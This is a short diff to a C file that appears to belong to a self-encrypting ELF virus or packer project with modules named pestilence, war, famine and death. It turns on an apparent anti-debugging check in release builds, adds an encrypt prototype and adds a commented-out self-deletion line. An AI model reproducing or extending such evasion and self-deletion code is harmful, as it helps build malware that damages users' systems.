@@ -9,12 +9,15 @@
 #include "map.h"
 #include "utils.h"
 #include "bss.h"
-#include "pestilence.h"
 #include "war.h"
 #include "famine.h"
+#include "pestilence.h"
 #include "death.h"
 #include "syscall.h"
-#include "errno.h"
+
+#ifdef DEBUG
+ #include "error.h"
+#endif
 
 #ifndef PATH1
  #ifdef FUN
@@ -38,6 +41,7 @@ extern void	real_end(void);
 void	famine(bootstrap_data_t *bootstrap_data, uint16_t *counter);
 void	jmp_end(void);
 void	entrypoint(int argc, char **argv, char **envp);
+void	encrypt(uint8_t *data, const size_t size, uint8_t *key);
 void	decrypt_self(void);
 void	real_start(void);
 void	_start(void);
@@ -330,7 +334,9 @@ void	entrypoint(int argc, char **argv, char **envp)
 	file_t file;
 	ft_memset(&file, 0, sizeof(file_t));
 
-	//if (pestilence() != 0) return ;
+#ifndef DEBUG
+	if (pestilence() != 0) return ;
+#endif
 
 	/* saving these values (they will be overwritten by the packer) */
 	uint8_t key[KEY_SIZE];
@@ -355,6 +361,10 @@ void	entrypoint(int argc, char **argv, char **envp)
 	if (war(counter, &file, saved.start_offset) != 0) return ;
 
 	death(&saved, &file);
+
+	//if (g_start_offset == ORIG_TEXT_OFF) {
+	//	unlink(bootstrap_data.argv[0]);
+	//}
 }
 
 /* junk */
